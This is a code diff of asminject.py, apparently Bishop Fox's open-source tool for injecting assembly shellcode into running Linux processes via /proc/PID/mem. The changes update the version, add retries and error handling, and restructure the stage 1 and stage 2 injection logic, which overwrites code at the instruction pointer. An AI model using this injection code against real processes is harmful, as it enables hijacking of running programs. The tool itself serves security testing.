@@ -12,8 +12,8 @@ BANNER = r"""
         \/                   \/\______|    \/     \/     \/|__|   \/
 
 asminject.py
-v0.5
-Ben Lincoln, Bishop Fox, 2021-08-31
+v0.6
+Ben Lincoln, Bishop Fox, 2021-09-01
 https://github.com/BishopFox/asminject
 based on dlinject, which is Copyright (c) 2019 David Buchanan
 dlinject source: https://github.com/DavidBuchanan314/dlinject
@@ -38,12 +38,15 @@ STAGE2_SIZE = 0x8000
 HIGH_PRIORITY_NICE = -20
 LOW_PRIORITY_NICE = 20
 
+SLEEP_TIME_WAITING_FOR_SYSCALLS = 0.1
+
 MAX_ADDRESS_NPIC_SUGGESTION = 0x00400000
 
 def ansi_color(name):
     color_codes = {
         "blue": 34,
         "red": 91,
+        "orange": 209,
         "green": 32,
         "default": 39,
     }
@@ -109,7 +112,7 @@ def assemble(source, library_bases, relative_offsets, replacements = {}, ansi=Tr
     
     if len(missing_values) > 0:
         log_error(f"The following placeholders in the assembly source code code not be found: {missing_values}")
-        sys.exit(1)
+        return None
 
     (tf, out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
     os.close(tf)
@@ -257,129 +260,67 @@ def asminject(base_script_path, pid, asm_path, relative_offsets, non_pic_binarie
     else:
         log.warn("We're not going to stop the process first!", ansi=ansi)
 
-    syscall_check_result = get_syscall_values(pid)
-    rip = syscall_check_result["rip"]
-    rsp = syscall_check_result["rsp"]
-    #original_rip = rip
-    #original_rsp = rsp
-    if rip == 0 or rsp == 0:
-        log_error("Couldn't get current syscall data")
-        sys.exit(1)
-    log(f"RIP: {hex(rip)}", ansi=ansi)
-    log(f"RSP: {hex(rsp)}", ansi=ansi)
+    continue_executing = True
+    try:
+        got_initial_syscall_data = False
+        syscall_check_result = None
+        rip = 0
+        rsp = 0
+        while not got_initial_syscall_data:
+            syscall_check_result = get_syscall_values(pid)
+            rip = syscall_check_result["rip"]
+            rsp = syscall_check_result["rsp"]
+            if rip == 0 or rsp == 0:
+                log_error("Couldn't get current syscall data")
+                time.sleep(SLEEP_TIME_WAITING_FOR_SYSCALLS)
+            else:
+                got_initial_syscall_data = True
+        log(f"RIP: {hex(rip)}", ansi=ansi)
+        log(f"RSP: {hex(rsp)}", ansi=ansi)
 
-    library_bases = get_library_base_addresses(pid, non_pic_binaries, ansi=ansi)
-    library_names = []
-    for lname in library_bases.keys():
-        library_names.append(lname)
-    library_names.sort()
-    for lname in library_names:
-        log(f"{lname}: 0x{library_bases[lname]:016x}", ansi=ansi)
-    
-    stage2_write_path = ""
-    if stage_2_write_location == "":
-        stage2_write_path = get_temp_file_name()
-    else:
-        stage2_write_path = stage_2_write_location
-    
-    stage2_read_path = ""
-    if stage_2_read_location == "":
-        stage2_read_path = stage2_write_path
-    else:
-        stage2_read_path = stage_2_read_location
-
-    stage1 = None
-    
-    stage1_source_filename = "stage1-file.s"
-    if stage_mode == "mem":
-        stage1_source_filename = "stage1-memory.s"
-    stage1_path = os.path.join(base_script_path, "asm", architecture, stage1_source_filename)
-    if not os.path.isfile(stage1_path):
-        log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=ansi)
-        sys.exit(1)
-    
-    stage1_replacements = {}
-    stage1_replacements['[VARIABLE:STAGE2_SIZE:VARIABLE]'] = f"{STAGE2_SIZE}"
-    stage1_replacements['[VARIABLE:STAGE2_PATH:VARIABLE]'] = stage2_read_path
-    with open(stage1_path, "r") as stage1_code:
-        stage1 = assemble(stage1_code.read(), library_bases, relative_offsets, replacements=stage1_replacements, ansi=ansi)
-
-    if stage_mode == "mem":
-        with open(f"/proc/{pid}/mem", "rb") as mem:
-            # Get initial RSP value for comparison
-            log(f"RSP is 0x{rsp:016x}")
-            mem.seek(rsp)
-            #mem.seek(rsp + 16)
-            rsp_value = struct.unpack('Q', mem.read(8))[0]
-            mem.seek(rsp + 8)
-            #mem.seek(rsp + 24)
-            mmap_block = struct.unpack('Q', mem.read(8))[0]
-            log(f"Value at RSP is 0x{rsp_value:016x}")
-            log(f"MMAP'd block is 0x{mmap_block:016x}")
-
-    with open(f"/proc/{pid}/mem", "wb+") as mem:
-        # back up the code we're about to overwrite
-        mem.seek(rip)
-        code_backup = mem.read(len(stage1))
-
-        # back up the part of the stack that the shellcode will clobber
-        mem.seek(rsp - STACK_BACKUP_SIZE)
-        stack_backup = mem.read(STACK_BACKUP_SIZE)
-
-        # write the primary shellcode
-        mem.seek(rip)
-        mem.write(stage1)
-
-    log(f"Wrote first stage shellcode at {rip:016x} in target process {pid}", ansi=ansi)
-
-    if not os.path.isfile(asm_path):
-        log_error(f"Could not find the stage 2 file '{asm_path}'", ansi=ansi)
-        sys.exit(1)
-
-    stage2 = None
+        library_bases = get_library_base_addresses(pid, non_pic_binaries, ansi=ansi)
+        library_names = []
+        for lname in library_bases.keys():
+            library_names.append(lname)
+        library_names.sort()
+        for lname in library_names:
+            log(f"{lname}: 0x{library_bases[lname]:016x}", ansi=ansi)
         
-    if precompiled:
-        with open(asm_path, "rb") as asm_code:
-            stage2 = asm_code.read()
-    else:
-        stage2_replacements = custom_replacements
-        stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
-        stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
-        stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
-        stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{STACK_BACKUP_SIZE}"
-        stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
-        stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
-        stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-STACK_BACKUP_SIZE)}"
-        with open(asm_path, "r") as asm_code:
-            stage2 = assemble(asm_code.read(), library_bases, relative_offsets, replacements=stage2_replacements)
-    
-    if stage_mode == "mem":
-        done_waiting = False
-        with open(f"/proc/{pid}/mem", "wb+") as mem:
-            while not done_waiting:
-                syscall_data = ""
-                try:
-                    # check to see if stage 1 has given the OK to proceed
-                    syscall_check_result = get_syscall_values(pid)
-                    rip = syscall_check_result["rip"]
-                    rsp = syscall_check_result["rsp"]
-                    # with open(f"/proc/{pid}/syscall") as syscall_file:
-                        # syscall_data = syscall_file.read()
-                        # syscall_vals = syscall_data.split(" ")
-                    # if " " in syscall_data:
-                        # rip = int(syscall_vals[-1][2:], 16)
-                        # rsp = int(syscall_vals[-2][2:], 16)
-                    # else:
-                        # log(f"Couldn't retrieve current RIP/RSP values")
-                    #log(f"RIP is 0x{rip:016x}")
-                    #mem.seek(rip)
-                    #rip_value = struct.unpack('Q', mem.read(8))[0]
-                    #mem.seek(rip) + 8
-                    #mmap_block = struct.unpack('Q', mem.read(8))[0]
-                    #log(f"Value at RIP is 0x{rip_value:016x}")
-                    #log(f"MMAP'd block ([RIP + 8]) is 0x{mmap_block:016x}")
-                    sleep_this_iteration = True
-                    if rip != 0 and rsp != 0:
+        stage2_write_path = ""
+        if stage_2_write_location == "":
+            stage2_write_path = get_temp_file_name()
+        else:
+            stage2_write_path = stage_2_write_location
+        
+        stage2_read_path = ""
+        if stage_2_read_location == "":
+            stage2_read_path = stage2_write_path
+        else:
+            stage2_read_path = stage_2_read_location
+
+        stage1 = None
+        
+        stage1_source_filename = "stage1-file.s"
+        if stage_mode == "mem":
+            stage1_source_filename = "stage1-memory.s"
+        stage1_path = os.path.join(base_script_path, "asm", architecture, stage1_source_filename)
+        if not os.path.isfile(stage1_path):
+            log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=ansi)
+            continue_executing = False
+        
+        if continue_executing:
+            stage1_replacements = {}
+            stage1_replacements['[VARIABLE:STAGE2_SIZE:VARIABLE]'] = f"{STAGE2_SIZE}"
+            stage1_replacements['[VARIABLE:STAGE2_PATH:VARIABLE]'] = stage2_read_path
+            with open(stage1_path, "r") as stage1_code:
+                stage1 = assemble(stage1_code.read(), library_bases, relative_offsets, replacements=stage1_replacements, ansi=ansi)
+
+            if not stage1:
+                continue_executing = False
+            else:
+                if stage_mode == "mem":
+                    with open(f"/proc/{pid}/mem", "rb") as mem:
+                        # Get initial RSP value for comparison
                         log(f"RSP is 0x{rsp:016x}")
                         mem.seek(rsp)
                         #mem.seek(rsp + 16)
@@ -389,38 +330,102 @@ def asminject(base_script_path, pid, asm_path, relative_offsets, non_pic_binarie
                         mmap_block = struct.unpack('Q', mem.read(8))[0]
                         log(f"Value at RSP is 0x{rsp_value:016x}")
                         log(f"MMAP'd block is 0x{mmap_block:016x}")
-                        
-                        if rsp_value == 0:
-                            sleep_this_iteration = False
-                            log(f"Writing stage 2 to 0x{mmap_block:016x} in target memory")
-                            # write stage 2
-                            mem.seek(mmap_block)
-                            mem.write(stage2)
-                            
-                            # Give stage 1 the OK to proceed
-                            log(f"Writing 0x01 to 0x{rsp:016x} in target memory to indicate OK")
-                            mem.seek(rsp)
-                            ok_val = struct.pack('I', 1)
-                            mem.write(ok_val)
-                            done_waiting = True
-                            log("Stage 2 proceeding")
-                        
-                    if sleep_this_iteration:
-                        log("Waiting for stage 1")
-                        time.sleep(1.0)
-                except Exception as e:
-                    log_error(f"Couldn't get target process information: {e}, {syscall_data}")
-                    sys.exit(1)
-    else:
-        with open(stage2_write_path, "wb") as stage2_file:
-            os.chmod(stage2_write_path, 0o666)
-            stage2_file.write(stage2)
-        log(f"Wrote stage 2 to {repr(stage2_write_path)}", ansi=ansi)
 
-        if pause:
-            log(f"If the target process is operating with a different filesystem root, copy the stage 2 binary to {repr(stage2_read_path)} in the target container before proceeding", ansi=ansi)
-            input("Press Enter to continue...")
+                with open(f"/proc/{pid}/mem", "wb+") as mem:
+                    # back up the code we're about to overwrite
+                    mem.seek(rip)
+                    code_backup = mem.read(len(stage1))
 
+                    # back up the part of the stack that the shellcode will clobber
+                    mem.seek(rsp - STACK_BACKUP_SIZE)
+                    stack_backup = mem.read(STACK_BACKUP_SIZE)
+
+                    # write the primary shellcode
+                    mem.seek(rip)
+                    mem.write(stage1)
+
+                log(f"Wrote first stage shellcode at {rip:016x} in target process {pid}", ansi=ansi)
+
+                if not os.path.isfile(asm_path):
+                    log_error(f"Could not find the stage 2 file '{asm_path}'", ansi=ansi)
+                    continue_executing = False
+
+        if continue_executing:
+            stage2 = None
+                
+            if precompiled:
+                with open(asm_path, "rb") as asm_code:
+                    stage2 = asm_code.read()
+            else:
+                stage2_replacements = custom_replacements
+                stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
+                stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
+                stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
+                stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{STACK_BACKUP_SIZE}"
+                stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
+                stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
+                stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-STACK_BACKUP_SIZE)}"
+                with open(asm_path, "r") as asm_code:
+                    stage2 = assemble(asm_code.read(), library_bases, relative_offsets, replacements=stage2_replacements)
+            
+            if not stage2:
+                continue_executing = False
+            else:
+                if stage_mode == "mem":
+                    done_waiting = False
+                    with open(f"/proc/{pid}/mem", "wb+") as mem:
+                        while not done_waiting:
+                            syscall_data = ""
+                            try:
+                                # check to see if stage 1 has given the OK to proceed
+                                syscall_check_result = get_syscall_values(pid)
+                                rip = syscall_check_result["rip"]
+                                rsp = syscall_check_result["rsp"]
+                                sleep_this_iteration = True
+                                if rip != 0 and rsp != 0:
+                                    log(f"RSP is 0x{rsp:016x}")
+                                    mem.seek(rsp)
+                                    #mem.seek(rsp + 16)
+                                    rsp_value = struct.unpack('Q', mem.read(8))[0]
+                                    mem.seek(rsp + 8)
+                                    #mem.seek(rsp + 24)
+                                    mmap_block = struct.unpack('Q', mem.read(8))[0]
+                                    log(f"Value at RSP is 0x{rsp_value:016x}")
+                                    log(f"MMAP'd block is 0x{mmap_block:016x}")
+                                    
+                                    if rsp_value == 0:
+                                        sleep_this_iteration = False
+                                        log(f"Writing stage 2 to 0x{mmap_block:016x} in target memory")
+                                        # write stage 2
+                                        mem.seek(mmap_block)
+                                        mem.write(stage2)
+                                        
+                                        # Give stage 1 the OK to proceed
+                                        log(f"Writing 0x01 to 0x{rsp:016x} in target memory to indicate OK")
+                                        mem.seek(rsp)
+                                        ok_val = struct.pack('I', 1)
+                                        mem.write(ok_val)
+                                        done_waiting = True
+                                        log("Stage 2 proceeding")
+                                    
+                                if sleep_this_iteration:
+                                    log("Waiting for stage 1")
+                                    time.sleep(1.0)
+                            except Exception as e:
+                                log_error(f"Couldn't get target process information: {e}, {syscall_data}")
+                else:
+                    with open(stage2_write_path, "wb") as stage2_file:
+                        os.chmod(stage2_write_path, 0o666)
+                        stage2_file.write(stage2)
+                    log(f"Wrote stage 2 to {repr(stage2_write_path)}", ansi=ansi)
+
+                    if pause:
+                        log(f"If the target process is operating with a different filesystem root, copy the stage 2 binary to {repr(stage2_read_path)} in the target container before proceeding", ansi=ansi)
+                        input("Press Enter to continue...")
+    except KeyboardInterrupt as ki:
+        log_warning(f"Operator cancelled the injection attempt", ansi=ansi)
+        continue_executing = False
+    
     if stopmethod == "sigstop":
         log("Continuing process...", ansi=ansi)
         os.kill(pid, signal.SIGCONT)
